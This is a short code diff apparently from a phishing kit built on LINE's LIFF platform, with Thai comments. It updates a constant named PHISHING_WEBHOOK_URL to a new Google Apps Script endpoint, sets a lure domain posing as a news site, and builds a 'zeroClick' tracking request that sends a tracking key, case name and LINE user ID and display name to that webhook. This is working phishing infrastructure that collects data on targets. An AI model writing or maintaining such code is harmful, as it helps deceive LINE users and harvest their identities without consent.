@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxw40qY9b_yty_qF304WlLlQA55pNt8M9IRG4fTdREnd8Gx4waC151dqhj49paZyAir1w/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzUmnAWEAvB5reV7neyS_JZEcmxRNKo6sWEFVZ4Ev337H4gGX-aiS9XwteLoouqS9hhUQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -828,8 +828,9 @@
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
-                zeroClickTrackUrl += `&creatorId=${encodeURIComponent(userId)}`; // แก้ชื่อพารามิเตอร์ให้ชัดเจนว่าเป็น ID ของผู้สร้าง
-                zeroClickTrackUrl += `&creatorName=${encodeURIComponent(displayName)}`; // แก้ชื่อพารามิเตอร์ให้ชัดเจนว่าเป็นชื่อของผู้สร้าง
+                // แก้ไขจากเดิม - ระบุชัดเจนว่านี่เป็นข้อมูลของผู้สร้าง ไม่ใช่เป้าหมาย
+                zeroClickTrackUrl += `&creatorId=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&creatorName=${encodeURIComponent(displayName)}`;
                 zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
                 zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
